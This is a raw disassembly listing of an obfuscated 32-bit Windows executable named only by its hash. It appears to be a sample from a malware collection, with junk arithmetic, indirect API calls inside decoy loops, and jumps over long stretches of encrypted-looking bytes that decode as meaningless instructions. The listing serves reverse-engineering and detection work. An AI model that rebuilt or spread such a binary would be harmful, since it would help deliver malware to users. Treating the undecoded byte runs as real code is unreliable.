
dbc491443c0bcd6f2fa87768966813ed40ca8feba649e26da1106e28f357bc17.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    ecx,0x4d2f
  40100a:	add    BYTE PTR [eax],al
  40100c:	add    al,BYTE PTR [eax]
  40100e:	add    BYTE PTR [eax],al
  401010:	cmp    al,BYTE PTR [eax]
  401012:	add    BYTE PTR [eax],al
  401014:	add    BYTE PTR [eax],al
  401016:	add    DWORD PTR [eax],eax
  401018:	add    BYTE PTR [edx-0x74ab0000],bh
  40101e:	in     al,dx
  40101f:	sub    esp,0x30
  401022:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  401029:	mov    eax,ds:0x44e414
  40102e:	adc    eax,DWORD PTR ds:0x44e428
  401034:	mov    ds:0x44e414,eax
  401039:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  401040:	xor    ecx,0x17d8
  401046:	mov    ecx,DWORD PTR [ebp-0x4]
  401049:	push   ebx
  40104a:	and    DWORD PTR ds:0x448994,0x0
  401054:	xor    eax,eax
  401056:	add    eax,DWORD PTR ds:0x448994
  40105c:	inc    eax
  40105d:	mov    ds:0x448994,eax
  401062:	cmp    DWORD PTR ds:0x448994,0xa
  401069:	jne    0x40108c
  40106f:	push   DWORD PTR [ebp-0x10]
  401072:	push   DWORD PTR [ebp-0x28]
  401075:	push   DWORD PTR [ebp-0x20]
  401078:	push   0x74f6
  40107d:	push   DWORD PTR [ebp-0x24]
  401080:	push   DWORD PTR [ebp-0x28]
  401083:	push   DWORD PTR [ebp-0x20]
  401086:	call   DWORD PTR ds:0x4430c4
  40108c:	cmp    DWORD PTR ds:0x448994,0x9
  401093:	jne    0x4010a4
  401099:	mov    eax,ds:0x448994
  40109e:	inc    eax
  40109f:	mov    ds:0x448994,eax
  4010a4:	cmp    DWORD PTR ds:0x448994,0x17
  4010ab:	jb     0x401054
  4010b1:	add    DWORD PTR ds:0x448980,ecx
  4010b7:	mov    eax,0x7510857
  4010bc:	xor    ecx,eax
  4010be:	xor    DWORD PTR ds:0x44b6dc,0x226
  4010c8:	mov    ebx,0x32729e
  4010cd:	not    DWORD PTR ds:0x44b6e0
  4010d3:	jmp    0x4011a6
  4010d8:	dec    esi
  4010d9:	dec    edx
  4010da:	xor    al,0x5c
  4010dc:	fcom   DWORD PTR [edx+0x66]
  4010df:	jp     0x4010bd
  4010e1:	test   DWORD PTR [ebx+0x58],0x1384ad8
  4010e8:	jl     0x401166
  4010ea:	jl     0x401168
  4010ec:	mov    ds:0xcc7c7c7c,al
  4010f1:	(bad)  
  4010f2:	xor    ecx,ebx
  4010f4:	xor    eax,0xccddcfdb
  4010f9:	ja     0x401171
  4010fb:	or     ecx,DWORD PTR [esi]
  4010fd:	test   BYTE PTR [edx],0xf
  401100:	cmp    ecx,DWORD PTR [edi]
  401102:	retf   0x3712
  401105:	sbb    bl,BYTE PTR [edi]
  401107:	mov    ch,0x52
  401109:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40110f:	rol    esp,cl
  401111:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401118:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40111e:	out    dx,al
  40111f:	outs   dx,DWORD PTR ds:[esi]
  401120:	add    ebx,DWORD PTR ds:0x4ac4729e
  401126:	mov    al,ds:0x36dd215b
  40112b:	mov    eax,ds:0xa3c97380
  401131:	je     0x401169
  401133:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401139:	jecxz  0x401175
  40113b:	and    ebp,0x4f
  40113e:	aam    0x94
  401140:	dec    ebp
  401141:	inc    DWORD PTR [edi-0x2f5a886e]
  401147:	mov    cl,0x41
  401149:	loope  0x40116f
  40114b:	pop    ecx
  40114c:	sub    edi,DWORD PTR [eax-0x41639320]
  401152:	jae    0x401171
  401154:	retf   
  401155:	cwde   
  401156:	sub    eax,0xc85ce3c6
  40115b:	(bad)  
  40115c:	mov    dl,0xfa
  40115e:	loopne 0x4010f8
  401160:	cmp    eax,0xc76966cf
  401165:	sub    al,cl
  401167:	or     ch,dl
  401169:	sbb    eax,0xb39945d
  40116e:	outs   dx,DWORD PTR ds:[esi]
  40116f:	ins    DWORD PTR es:[edi],dx
  401170:	jb     0x401174
  401172:	cmp    eax,0x22468cd1
  401177:	jns    0x4011f8
  401179:	cmp    al,0x8f
  40117b:	add    bl,dl
  40117d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40117e:	add    edx,DWORD PTR [ebx+0x59]
  401181:	rol    esp,1
  401183:	add    eax,0x15d55edb
  401188:	jge    0x401126
  40118a:	mov    ah,0x43
  40118c:	daa    
  40118d:	sbb    DWORD PTR [ebx],esp
  40118f:	addr16 and eax,0x4f3cdb10
  401195:	loop   0x401165
  401197:	xchg   esi,eax
  401198:	int3   
  401199:	test   DWORD PTR [ebx],esp
  40119b:	mov    ch,0x19
  40119d:	push   edx
  40119e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40119f:	pop    es
  4011a0:	adc    eax,0x1290e3eb
  4011a5:	mov    ch,0x3
  4011a7:	retf   
  4011a8:	adc    DWORD PTR ds:0x4248d2,0x44e418
  4011b2:	mov    DWORD PTR [ebp-0x1c],ecx
  4011b5:	xor    DWORD PTR ds:0x41074f,0x5a6f
  4011bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4011c2:	adc    DWORD PTR ds:0x44e414,0x4248ce
  4011cc:	jmp    0x40129f
  4011d1:	inc    edi
  4011d2:	in     eax,0x24
  4011d4:	xor    bh,BYTE PTR [edx+0x6b7d7dcd]
  4011da:	inc    ebp
  4011db:	in     al,dx
  4011dc:	xchg   BYTE PTR ds:0xa2b2f79e,bl
  4011e2:	jl     0x401260
  4011e4:	jl     0x401188
  4011e6:	jl     0x401264
  4011e8:	jl     0x401197
  4011ea:	mov    ?,WORD PTR [eax+0x35ea7306]
  4011f0:	std    
  4011f1:	or     eax,0x16ac0064
  4011f6:	rcl    cl,cl
  4011f8:	dec    ecx
  4011f9:	nop
  4011fa:	dec    edx
  4011fb:	lea    esp,ds:0xbf5c861
  401201:	xchg   BYTE PTR [ebx+0x5a916603],al
  401207:	mov    edx,0xc09b2e03
  40120c:	mov    ecx,0x8780a19a
  401211:	ret    
  401212:	mov    ecx,DWORD PTR [ebx-0x30]
  401215:	cs out 0x18,eax
  401218:	(bad)  
  401219:	jmp    0xa629:0x89d0fe2
  401220:	cmp    BYTE PTR [edx+0x5c],cl
  401223:	add    eax,0xacf47648
  401228:	scas   eax,DWORD PTR es:[edi]
  401229:	pop    edi
  40122a:	in     al,dx
  40122b:	mov    ah,0x6c
  40122d:	out    dx,eax
  40122e:	or     al,0x63
  401230:	sti    
  401231:	dec    esi
  401232:	rcl    ah,cl
  401234:	aaa    
  401235:	push   ds
  401236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401237:	jge    0x401241
  401239:	push   edi
  40123a:	mov    al,0xd0
  40123c:	pop    ebx
  40123d:	in     al,0x40
  40123f:	xor    bl,BYTE PTR [eax]
  401241:	sbb    eax,0xfdf3aab4
  401246:	mov    cs,WORD PTR [ebp+0x5a]
  401249:	shl    BYTE PTR [edx+0x2a81f106],1
  40124f:	jb     0x401299
  401251:	ins    DWORD PTR es:[edi],dx
  401252:	sub    dh,ch
  401254:	js     0x4012bb
  401256:	sbb    bl,BYTE PTR [edi+ebx*8+0x65]
  40125a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40125b:	cmp    eax,0x43fcfa4c
  401260:	enter  0xe0d8,0x56
  401264:	add    ebp,DWORD PTR [ebx-0x3]
  401267:	fldenv [ebx]
  401269:	lahf   
  40126a:	jmp    0x40124b
  40126c:	in     al,dx
  40126d:	mov    dh,bl
  40126f:	pushf  
  401270:	jno    0x4012e5
  401272:	dec    eax
  401273:	xor    esp,DWORD PTR [ebx]
  401275:	(bad)  
  401277:	(bad)  
  401278:	and    bh,dl
  40127a:	mov    eax,ds:0x5b00b8f5
  40127f:	xor    dh,BYTE PTR [esi+0x6e]
  401282:	jecxz  0x4012d2
  401284:	xchg   edx,eax
  401285:	(bad)  
  401286:	aas    
  401287:	push   edi
  401288:	mov    bh,0xcb
  40128a:	xchg   ecx,eax
  40128b:	and    ah,BYTE PTR [ebp-0xbc63a9b]
  401291:	cmp    BYTE PTR [esi+0x7],dl
  401294:	push   ebx
  401295:	mov    cl,0xfb
  401297:	arpl   sp,ax
  401299:	sbb    eax,0xe954789c
  40129e:	xor    DWORD PTR [esi+0x57],edx
  4012a1:	test   ecx,ecx
  4012a3:	mov    DWORD PTR ds:0x4248d6,0x53ab
  4012ad:	je     0x401398
  4012b3:	and    ecx,ecx
  4012b5:	mov    ecx,DWORD PTR [ebp+0x14]
  4012b8:	and    edi,edi
  4012ba:	jmp    0x40138d
  4012bf:	xchg   DWORD PTR [edi-0x31],eax
  4012c2:	or     ecx,edi
  4012c4:	mov    ebx,DWORD PTR [ebx+0x5b]
  4012c7:	dec    esi
  4012c8:	popa   
  4012c9:	enter  0xa9fc,0x67
  4012cd:	sti    
  4012ce:	lods   al,BYTE PTR ds:[esi]
  4012cf:	call   0xa2bc8f53
  4012d4:	jl     0x401352
  4012d6:	jl     0x401305
  4012d8:	mov    dh,0x72
  4012da:	add    al,0xcc
  4012dc:	mov    dh,0x1f
  4012de:	stos   BYTE PTR es:[edi],al
  4012df:	jo     0x401307
  4012e1:	jbe    0x4012c0
  4012e3:	inc    edi
  4012e4:	ret    
  4012e5:	iret   
  4012e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012e7:	in     al,dx
  4012e8:	mov    ch,0xc6
  4012ea:	push   edx
  4012eb:	cmp    BYTE PTR [esi-0x1e],bh
  4012ee:	jl     0x401308
  4012f0:	sub    BYTE PTR [ebp+0x43e3c788],al
  4012f6:	and    eax,DWORD PTR [eax-0x4]
  4012f9:	mov    al,0xbe
  4012fb:	xor    BYTE PTR [edx+0x34f3a709],bh
  401301:	test   BYTE PTR [esi-0x22],cl
  401304:	call   0xe1ae:0xacc73c3e
  40130b:	inc    edx
  40130c:	aaa    
  40130d:	or     eax,0x9ee24be1
  401312:	push   ss
  401313:	leave  
  401314:	pop    edx
  401315:	in     al,dx
  401316:	hlt    
  401317:	cmp    BYTE PTR [esi+0x51],bl
  40131a:	lds    edx,FWORD PTR [ebx+eiz*2-0x7adc92cc]
  401321:	mov    ecx,0xaf15c11a
  401326:	stos   DWORD PTR es:[edi],eax
  401327:	scas   eax,DWORD PTR es:[edi]
  401328:	sub    al,0xea
  40132a:	cmp    al,0xe4
  40132c:	in     eax,dx
  40132d:	in     eax,dx
  40132e:	xor    al,0x18
  401330:	shl    BYTE PTR [ecx],0x5d
  401333:	add    DWORD PTR [esi-0x2],ebx
  401336:	or     eax,0x358ac3aa
  40133b:	sub    DWORD PTR [ecx],eax
  40133d:	imul   ecx,ebp
  401340:	push   cs
  401341:	gs in  al,dx
  401343:	aaa    
  401344:	mov    cl,0x8a
  401346:	(bad)  
  401347:	fcomp  QWORD PTR [ecx-0x67]
  40134a:	loopne 0x4013c4
  40134c:	jecxz  0x4012f6
  40134e:	pop    edi
  40134f:	cli    
  401350:	cli    
  401351:	popa   
  401352:	hlt    
  401353:	push   0x7ad8da99
  401358:	inc    ecx
  401359:	jge    0x4013ab
  40135b:	xor    DWORD PTR [ebx],edx
  40135d:	stc    
  40135e:	jae    0x40133c
  401360:	fwait
  401361:	std    
  401362:	xor    BYTE PTR [esi],ah
  401364:	push   ebx
  401365:	sub    al,0x2c
  401367:	sbb    al,0xcb
  401369:	stos   BYTE PTR es:[edi],al
  40136a:	push   es
  40136b:	repz shl BYTE PTR [eax],1
  40136e:	push   ecx
  40136f:	cld    
  401370:	lock sar edi,1
  401373:	or     eax,0x9c9b2529
  401378:	mov    cl,BYTE PTR [ecx]
  40137a:	(bad)  
  40137b:	xchg   ecx,eax
  40137c:	lds    ebx,FWORD PTR ds:0x15300b8
  401382:	dec    esp
  401383:	mov    ebp,0x25169a1e
  401388:	xor    eax,0x6a8d75f6
  40138d:	mov    ecx,DWORD PTR [ecx]
  40138f:	sub    DWORD PTR ds:0x41074f,ebx
  401395:	mov    DWORD PTR [ebp-0x1c],ecx
  401398:	sbb    esi,ecx
  40139a:	imul   edx,eax
  40139d:	and    DWORD PTR ds:0x4248ce,0x618e
  4013a7:	mov    ecx,0x4573
  4013ac:	mov    DWORD PTR ds:0x44b6d8,0x19
  4013b6:	cmp    DWORD PTR ds:0x44b6d8,0x0
  4013bd:	je     0x4013f3
  4013c3:	cmp    DWORD PTR ds:0x44b6d8,0x1a
  4013ca:	jne    0x4013d9
  4013d0:	push   DWORD PTR [ebp-0x1c]
  4013d3:	call   DWORD PTR ds:0x443338
  4013d9:	xor    edi,edi
  4013db:	or     edi,DWORD PTR ds:0x44b6d8
  4013e1:	dec    edi
  4013e2:	mov    DWORD PTR ds:0x44b6d8,edi
  4013e8:	jmp    0x4013b6
  4013ed:	xor    DWORD PTR ds:0x448980,edx
  4013f3:	add    edx,ecx
  4013f5:	inc    edi
  4013f6:	mov    esi,0x7879
  4013fb:	add    DWORD PTR ds:0x44b6e8,edx
  401401:	mov    edi,0x1556
  401406:	sub    DWORD PTR ds:0x4489a4,0x41074b
  401410:	xchg   esi,ecx
  401412:	xor    DWORD PTR ds:0x44e420,ecx
  401418:	sub    edx,edi
  40141a:	or     ecx,0x50d4
  401420:	xor    esi,esi
  401422:	mov    DWORD PTR [ebp-0x28],esi
  401425:	movzx  ecx,WORD PTR ds:0x44e420
  40142c:	xor    DWORD PTR ds:0x44e414,ecx
  401432:	mov    DWORD PTR [ebp-0x2c],esi
  401435:	or     ecx,0x6619
  40143b:	mov    DWORD PTR [ebp-0x14],esi
  40143e:	mov    ecx,DWORD PTR ds:0x410757
  401444:	xor    DWORD PTR ds:0x4248c6,ecx
  40144a:	jmp    0x40151d
  40144f:	ficom  WORD PTR [esi+0x7b7d5fa5]
  401455:	loop   0x401400
  401457:	sbb    al,0x21
  401459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40145a:	out    dx,eax
  40145b:	jae    0x40142c
  40145d:	ficomp WORD PTR [ecx]
  40145f:	push   ds
  401460:	jle    0x4014de
  401462:	jl     0x401406
  401464:	jl     0x4014e2
  401466:	jl     0x4014d1
  401468:	outs   dx,DWORD PTR ds:[esi]
  401469:	fptan  
  40146b:	fwait
  40146c:	stos   DWORD PTR es:[edi],eax
  40146d:	shl    DWORD PTR [ebp+0x345cb52],cl
  401473:	rcr    BYTE PTR [ecx+esi*2-0x7e],0xc
  401478:	into   
  401479:	addr16 enter 0x927d,0xa4
  40147e:	imul   DWORD PTR [ebx-0x8]
  401481:	mov    ch,0xa6
  401483:	xchg   esi,eax
  401484:	lock xor edx,DWORD PTR ss:[ebx]
  401488:	lods   eax,DWORD PTR ds:[esi]
  401489:	rcr    DWORD PTR [edi-0x36],0xb6
  40148d:	out    dx,al
  40148e:	or     BYTE PTR [edi-0x624ba13f],bh
  401494:	adc    eax,0x97cec06
  401499:	call   0x2b9e:0xe76ce4a1
  4014a0:	jl     0x401479
  4014a2:	lea    ebx,[edi]
  4014a4:	jnp    0x401427
  4014a6:	or     dl,bl
  4014a8:	and    al,BYTE PTR [eax]
  4014aa:	scas   al,BYTE PTR es:[edi]
  4014ab:	add    ecx,DWORD PTR [eax+0x20]
  4014ae:	(bad)  
  4014b0:	xchg   BYTE PTR [ecx-0x1c135bd5],al
  4014b6:	test   al,0xfb
  4014b8:	scas   eax,DWORD PTR es:[edi]
  4014b9:	mov    BYTE PTR ds:0xb5a714d1,dh
  4014bf:	fidiv  DWORD PTR [ebp+ebx*1+0x53]
  4014c3:	dec    ebx
  4014c4:	ret    0xbc8f
  4014c7:	and    DWORD PTR [ebp+0x65a5226d],eax
  4014cd:	push   0xb9262d7a
  4014d2:	ret    0x5cc9
  4014d5:	cli    
  4014d6:	arpl   WORD PTR [edx+0x5d09b6a],bx
  4014dc:	xor    al,0x45
  4014de:	push   edi
  4014df:	add    eax,0x707e34c4
  4014e4:	je     0x4014f9
  4014e6:	xchg   edi,eax
  4014e7:	and    al,dh
  4014e9:	fidiv  DWORD PTR [edx-0x1d2811a1]
  4014ef:	(bad)  
  4014f0:	adc    ch,BYTE PTR [ecx]
  4014f2:	popw   ds
  4014f4:	js     0x401568
  4014f6:	sbb    eax,0x2e3706b4
  4014fb:	ja     0x40153e
  4014fd:	outs   dx,DWORD PTR ds:[esi]
  4014fe:	fdivr  st(5),st
  401500:	pop    edi
  401501:	cmp    ecx,ecx
  401503:	sub    ebx,DWORD PTR [edi+0x7c]
  401506:	out    dx,eax
  401507:	lds    esp,FWORD PTR [eax]
  401509:	mov    DWORD PTR [ecx+0x14],ebp
  40150c:	adc    eax,0x1b2a6552
  401511:	(bad)  
  401512:	out    dx,eax
  401513:	xchg   ebp,eax
  401514:	xrelease mov DWORD PTR [edi-0x36],eax
  401518:	(bad)  
  401519:	jle    0x401548
  40151b:	cdq    
  40151c:	clc    
  40151d:	mov    DWORD PTR [ebp-0x8],esi
  401520:	jmp    0x4015f3
  401525:	add    DWORD PTR [eax],edi
  401527:	repz push esp
  401529:	lods   eax,DWORD PTR ds:[esi]
  40152a:	addr16 std 
  40152c:	jge    0x401526
  40152e:	stc    
  40152f:	icebp  
  401530:	sahf   
  401531:	dec    esp
  401532:	xor    DWORD PTR [eax+0x7c7e4483],edx
  401538:	jl     0x4014dc
  40153a:	jl     0x4015b8
  40153c:	jl     0x4014be
  40153e:	test   al,0xf1
  401540:	rcr    DWORD PTR [ebp+0x6ebd7e0a],1
  401546:	pusha  
  401547:	jp     0x40153d
  401549:	call   0xf569:0xb515edaa
  401550:	hlt    
  401551:	sub    bh,BYTE PTR [ebp+0x2c]
  401554:	fsubr  DWORD PTR [eax-0x731fd68b]
  40155a:	(bad)
  40155f:	ror    DWORD PTR [esi-0xc],1
  401562:	xor    al,BYTE PTR [eax]
  401564:	and    eax,edi
  401566:	xor    edi,DWORD PTR [esi]
  401568:	pop    ebx
  401569:	aam    0x21
  40156b:	cmp    al,0x4c
  40156d:	ror    DWORD PTR [eax],cl
  40156f:	fild   QWORD PTR [ebp+0x3a5a9c3e]
  401575:	retf   0xe04e
  401578:	test   BYTE PTR [ebx+0x2c],bl
  40157b:	fild   WORD PTR [ebp-0x1c]
  40157e:	jns    0x4015bf
  401580:	jns    0x401589
  401582:	scas   al,BYTE PTR es:[edi]
  401583:	in     al,dx
  401584:	add    BYTE PTR [ecx-0x1ac619a1],al
  40158a:	aaa    
  40158b:	sbb    ecx,eax
  40158d:	cs loop 0x4015b5
  401590:	retf   0x2b5f
  401593:	repnz out 0x2b,eax
  401596:	and    eax,0x337710f7
  40159b:	push   0x7386527c
  4015a0:	not    BYTE PTR [eax]
  4015a2:	xor    DWORD PTR fs:[ecx-0x78],esp
  4015a6:	ins    DWORD PTR es:[edi],dx
  4015a7:	push   cs
  4015a8:	addr16 push edi
  4015aa:	test   eax,0xa2b397a2
  4015af:	mov    ah,0x6b
  4015b1:	xchg   edx,eax
  4015b2:	in     al,0x3a
  4015b4:	mov    al,ch
  4015b6:	pop    eax
  4015b7:	add    esi,DWORD PTR [esi]
  4015b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015ba:	scas   al,BYTE PTR es:[edi]
  4015bb:	mov    dl,0x62
  4015be:	push   ecx
  4015bf:	stos   BYTE PTR es:[edi],al
  4015c0:	or     BYTE PTR [edi],bh
  4015c2:	inc    eax
  4015c3:	jbe    0x40158c
  4015c5:	xchg   ebp,eax
  4015c6:	ret    
  4015c7:	cmp    eax,0xd2523cce
  4015cc:	jmp    0xe7a7:0xab4f862f
  4015d3:	push   eax
  4015d4:	popf   
  4015d5:	ret    0xd33d
  4015d8:	in     eax,dx
  4015d9:	push   ebp
  4015da:	cmp    DWORD PTR [ebx],eax
  4015dc:	sti    
  4015dd:	xor    bh,BYTE PTR [eax+0x57]
  4015e0:	jmp    0x401653
  4015e2:	lea    edx,[ecx]
  4015e4:	lea    esp,[ebx]
  4015e6:	ficomp DWORD PTR [esi]
  4015e8:	bts    DWORD PTR [esi+0x5a],0x45
  4015ed:	xchg   esp,eax
  4015ee:	(bad)  
  4015f0:	daa    
  4015f1:	outs   dx,BYTE PTR ds:[esi]
  4015f2:	mov    ecx,DWORD PTR fs:[ebp-0x18]
  4015f6:	sbb    DWORD PTR ds:0x410743,0x410747
  401600:	xor    ecx,eax
  401602:	mov    DWORD PTR ds:0x41074b,0x13
  40160c:	cmp    DWORD PTR ds:0x41074b,0x0
  401613:	je     0x401657
  401619:	cmp    DWORD PTR ds:0x41074b,0x2
  401620:	jne    0x40162f
  401626:	push   DWORD PTR [ebp-0xc]
  401629:	call   DWORD PTR ds:0x44333c
  40162f:	cmp    DWORD PTR ds:0x41074b,0x3
  401636:	jne    0x401647
  40163c:	mov    eax,ds:0x41074b
  401641:	dec    eax
  401642:	mov    ds:0x41074b,eax
  401647:	mov    eax,ds:0x41074b
  40164c:	dec    eax
  40164d:	mov    ds:0x41074b,eax
  401652:	jmp    0x40160c
  401657:	xor    edi,edi
  401659:	add    ecx,ebx
  40165b:	mov    eax,ds:0x4248da
  401660:	mov    DWORD PTR [ebp-0x20],ecx
  401663:	mov    eax,DWORD PTR [ebp-0x20]
  401666:	mov    DWORD PTR ds:0x410747,0x348
  401670:	je     0x402298
  401676:	mov    eax,DWORD PTR [ebp-0x4]
  401679:	xor    DWORD PTR ds:0x44b6d8,0x44e410
  401683:	xor    eax,0x7510857
  401688:	jmp    0x40175b
  40168d:	in     eax,0x57
  40168f:	iret   
  401690:	call   0x2571:0x577dba5d
  401697:	mov    esi,0x2ba4116a
  40169c:	push   esi
  40169d:	mov    dh,BYTE PTR [ecx+0x7c]
  4016a0:	jl     0x401644
  4016a2:	jl     0x401720
  4016a4:	jl     0x4016c8
  4016a6:	aad    0xcb
  4016a8:	cmp    DWORD PTR [ecx-0x37],ecx
  4016ab:	push   0xd2b80b08
  4016b0:	pop    edi
  4016b1:	pop    es
  4016b2:	and    BYTE PTR [esi],dh
  4016b4:	int    0xdc
  4016b6:	scas   eax,DWORD PTR es:[edi]
  4016b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016b8:	popa   
  4016b9:	mov    bl,BYTE PTR ds:0x5ee261c7
  4016bf:	fadd   QWORD PTR [ecx+0x69fafc13]
  4016c5:	test   edi,ebp
  4016c7:	and    ecx,ebx
  4016c9:	fbld   TBYTE PTR [eax-0x5a]
  4016cc:	aas    
  4016cd:	loope  0x401686
  4016cf:	pop    edx
  4016d0:	out    dx,eax
  4016d1:	test   eax,0x5807a164
  4016d6:	dec    esi
  4016d7:	imul   ecx,DWORD PTR [esi],0x64
  4016da:	stos   BYTE PTR es:[edi],al
  4016db:	aam    0xa6
  4016dd:	ins    DWORD PTR es:[edi],dx
  4016de:	(bad)  
  4016df:	rol    DWORD PTR ds:0x1c75a08d,1
  4016e5:	jge    0x4016b6
  4016e7:	lock dec ecx
  4016e9:	or     eax,0xe92bc5fe
  4016ee:	cli    
  4016ef:	mov    bl,0x1c
  4016f1:	fldlg2 
  4016f3:	push   ebp
  4016f4:	bound  ecx,QWORD PTR [edx-0x37e772a2]
  4016fa:	(bad)  
  4016fb:	clc    
  4016fc:	scas   al,BYTE PTR es:[edi]
  4016fd:	inc    ebx
  4016fe:	and    BYTE PTR [ebp-0x31],dl
  401701:	ficomp DWORD PTR ds:0x1c9c3d66
  401707:	pop    esp
  401708:	neg    BYTE PTR [esi+0x74]
  40170b:	add    al,0x52
  40170d:	pop    ebx
  40170e:	xchg   ebp,eax
  40170f:	popf   
  401710:	inc    ecx
  401711:	pop    esp
  401712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401713:	add    ecx,eax
  401715:	jle    0x4016e2
  401717:	das    
  401718:	(bad)  
  401719:	pop    edi
  40171a:	imul   ecx,DWORD PTR [edi+0x41],0xffffffbb
  40171e:	push   ebp
  40171f:	cld    
  401720:	sbb    esi,DWORD PTR [edx+0x1e]
  401723:	mov    ds:0x76b6ceb,al
  401728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401729:	and    eax,0x868672ba
  40172e:	paddusw mm6,QWORD PTR [ebx-0x34]
  401732:	jmp    0xf91d076
  401737:	scas   eax,DWORD PTR es:[edi]
  401738:	out    dx,al
  401739:	xchg   ebx,eax
  40173a:	dec    edx
  40173b:	xchg   edx,eax
  40173c:	add    ch,BYTE PTR [ecx-0x1f8ac9ce]
  401742:	xchg   BYTE PTR [ebp+eax*2-0x7576af03],ch
  401749:	xchg   edx,eax
  40174a:	jno    0x40178b
  40174c:	push   eax
  40174d:	cs jno 0x40170b
  401750:	addr16 jle 0x40170f
  401753:	enter  0x883e,0x7b
  401757:	pop    es
  401758:	mov    ds:0xc303c626,al
  40175d:	mov    DWORD PTR ds:0x4489a4,0x156f
  401767:	cmp    edi,eax
  401769:	mov    DWORD PTR ds:0x44e414,0x5e58
  401773:	jne    0x401eef
  401779:	push   DWORD PTR [ebp+0x8]
  40177c:	add    DWORD PTR ds:0x44b6e4,0x4489a0
  401786:	call   0x409b25
  40178b:	mov    DWORD PTR ds:0x44e414,0x72d4
  401795:	mov    DWORD PTR [ebp-0x20],eax
  401798:	and    DWORD PTR ds:0x41073f,0x0
  4017a2:	jmp    0x4017b4
  4017a7:	mov    ecx,DWORD PTR ds:0x41073f
  4017ad:	inc    ecx
  4017ae:	mov    DWORD PTR ds:0x41073f,ecx
  4017b4:	cmp    DWORD PTR ds:0x41073f,0x16
  4017bb:	jae    0x4018af
  4017c1:	cmp    DWORD PTR ds:0x41073f,0x25
  4017c8:	jne    0x4017d7
  4017ce:	push   DWORD PTR [ebp-0x1c]
  4017d1:	call   DWORD PTR ds:0x443340
  4017d7:	jmp    0x4017a7
  4017dc:	jmp    0x4018af
  4017e1:	fdiv   st(2),st
  4017e3:	jmp    0xef7a:0x5462fa52
  4017ea:	into   
  4017eb:	outs   dx,DWORD PTR ds:[esi]
  4017ec:	inc    ecx
  4017ed:	or     eax,0x3015fa91
  4017f2:	jo     0x401870
  4017f4:	jl     0x401798
  4017f6:	jl     0x401874
  4017f8:	jl     0x4017c6
  4017fa:	mov    bh,BYTE PTR [esi-0x6b8222c8]
  401800:	mov    al,ds:0xe7d20f60
  401805:	ins    BYTE PTR es:[edi],dx
  401806:	inc    edi
  401807:	lock or eax,edi
  40180a:	jl     0x4017b7
  40180c:	addr16 mov ebx,0x4d4fac9
  401812:	sub    edi,edx
  401814:	jno    0x40183e
  401816:	aas    
  401817:	mov    ebx,0xb0d16a95
  40181c:	push   eax
  40181d:	push   ebp
  40181e:	scas   al,BYTE PTR es:[edi]
  40181f:	cmp    ah,BYTE PTR [ecx+0x1d44abbd]
  401825:	rol    dh,cl
  401827:	pushf  
  401828:	mov    dh,0x74
  40182a:	jle    0x401884
  40182c:	call   0x5bea940d
  401831:	in     al,dx
  401832:	fsub   QWORD PTR [ecx+0x17]
  401835:	les    ebp,FWORD PTR [ebp-0x27]
  401838:	add    al,0x66
  40183a:	inc    esp
  40183b:	imul   esi,ebx,0x1a6145ee
  401841:	repz loope 0x401862
  401844:	jns    0x401817
  401846:	sub    eax,0x22836b25
  40184b:	mov    WORD PTR [esi+0x69],ds
  40184e:	ss pop eax
  401850:	push   edi
  401851:	mov    BYTE PTR [edx-0x4601606c],al
  401857:	iret   
  401858:	aaa    
  401859:	nop
  40185a:	sub    DWORD PTR [ecx-0x739d64aa],esp
  401860:	out    dx,eax
  401861:	call   0x5690:0x13713ef5
  401868:	cwde   
  401869:	pop    ds
  40186a:	sbb    dh,dl
  40186c:	arpl   WORD PTR [esi+esi*8-0x75785df3],ax
  401873:	ret    0x8102
  401876:	inc    eax
  401877:	rcr    ebx,1
  401879:	test   esp,ebx
  40187b:	sbb    dl,BYTE PTR [edi+0x6f]
  40187e:	xchg   ecx,eax
  40187f:	mov    dl,0x80
  401881:	cwde   
  401882:	adc    eax,0x57517ab1
  401887:	mov    BYTE PTR [ebx+0x14],al
  40188a:	adc    al,0xdb
  40188c:	pop    es
  40188d:	stc    
  40188e:	jge    0x40186a
  401890:	in     al,dx
  401891:	inc    esp
  401892:	sbb    ah,BYTE PTR [edx-0x6a9446d2]
  401898:	test   eax,edi
  40189a:	jg     0x40188e
  40189c:	test   al,0x7b
  40189e:	mov    al,0xb1
  4018a0:	mov    al,ds:0xacc7f782
  4018a5:	fwait
  4018a6:	inc    ebp
  4018a7:	xchg   esp,eax
  4018a8:	sbb    al,0x3a
  4018aa:	inc    ecx
  4018ab:	imul   edx,DWORD PTR [esi-0x78],0x50
  4018af:	mov    eax,DWORD PTR [ebp-0x4]
  4018b2:	xor    DWORD PTR ds:0x44e40c,edi
  4018b8:	mov    ecx,DWORD PTR [ebp-0x20]
  4018bb:	adc    DWORD PTR ds:0x44b6d4,ebx
  4018c1:	mov    esi,0x7510857
  4018c6:	xor    eax,esi
  4018c8:	adc    DWORD PTR ds:0x44898c,0x4248da
  4018d2:	add    eax,ebx
  4018d4:	mov    DWORD PTR ds:0x448998,0x1172
  4018de:	cmp    ecx,eax
  4018e0:	mov    DWORD PTR ds:0x44899c,0x309e
  4018ea:	je     0x4021a9
  4018f0:	sub    DWORD PTR ds:0x41074b,0x410743
  4018fa:	push   DWORD PTR [ebp-0x20]
  4018fd:	jmp    0x4019d0
  401902:	js     0x40197b
  401904:	dec    ecx
  401905:	mov    bh,BYTE PTR [ebp+0x4a]
  401908:	jnp    0x401903
  40190a:	hlt    
  40190b:	push   esi
